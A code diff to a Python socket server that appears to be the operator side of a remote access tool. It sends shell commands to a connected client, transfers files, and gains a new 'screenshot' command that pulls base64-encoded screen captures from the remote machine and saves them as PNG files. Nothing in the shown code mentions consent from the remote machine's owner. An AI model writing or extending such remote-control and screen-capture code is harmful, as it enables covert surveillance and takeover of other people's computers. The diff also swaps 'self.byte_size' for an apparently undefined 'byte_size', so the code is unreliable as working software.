@@ -3,7 +3,7 @@ import os
 import sys
 import socket
 import base64
-
+from datetime import datetime
 with open('banner.txt', 'r', encoding='utf-8') as f:
     banner = f.read().replace('\\x1b','\x1b')
 
@@ -54,7 +54,7 @@ class Server:
             Sends the command to be executed to the client side
         """
         self.client.send(command.encode())
-        return self.client.recv(self.byte_size).decode()
+        return self.client.recv(byte_size).decode()
 
     def GetInput(self,input_value: str) -> str:
         """
@@ -94,6 +94,20 @@ class Server:
                     print("FILE NOT FOUND!")
                     pass
                 print(f"\x1b[1m{self.SendFile(path,name)}")
+
+            elif command.lower() == 'screenshot':
+                self.client.send(command.encode())
+                size = int(self.client.recv(1024).decode())
+                self.client.send('ok'.encode())
+                now = datetime.now()
+#                try:
+                with open(f'{str(now.day)}-{str(now.hour)}-{str(now.minute)}.png','wb') as f:
+                    encoded_content = self.client.recv(size * 2)
+                    content = base64.b64decode(encoded_content)
+                    f.write(content)
+#                except Exception as err:
+#                    print(err)
+
             else:
                 output = self.SendCommand(command)
                 print(f"\x1b[1m{output}\x1b[0m")
